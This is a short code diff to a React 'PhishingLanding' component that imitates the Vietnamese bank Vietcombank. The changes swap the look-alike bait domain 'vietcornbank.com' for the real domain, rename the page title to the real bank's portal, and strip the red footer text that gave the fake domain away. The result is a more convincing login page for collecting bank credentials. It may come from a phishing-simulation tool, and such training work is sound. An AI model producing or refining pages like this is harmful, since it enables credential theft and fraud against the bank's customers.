@@ -2,7 +2,7 @@ import React, { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import api from "../services/api";
 
-const baitDomain = "vietcornbank.com";
+const baitDomain = "vietcombank.com";
 
 const PhishingLanding = () => {
   const navigate = useNavigate();
@@ -12,7 +12,7 @@ const PhishingLanding = () => {
   const [status, setStatus] = useState(null);
 
   useEffect(() => {
-    document.title = "VietcornBank™ Secure Portal";
+    document.title = "Vietcombank Secure Portal";
   }, []);
 
   const handleSubmit = async (event) => {
@@ -63,7 +63,7 @@ const PhishingLanding = () => {
               value={username}
               onChange={(e) => setUsername(e.target.value)}
               required
-              placeholder="ten.dang.nhap@vietcombank.com"
+              placeholder="Nhập email..."
               autoComplete="username"
               disabled={submitting}
             />
@@ -100,7 +100,7 @@ const PhishingLanding = () => {
         <footer className="phish-footer">
           <small className="text-muted">
             © VietcomBank Security Division — 2025 · Hotline 1900 1234 ·
-            <span className="text-danger"> vietcornbank.com</span>
+            <span className="text-danger">vietcombank.com</span>
           </small>
         </footer>
       </div>
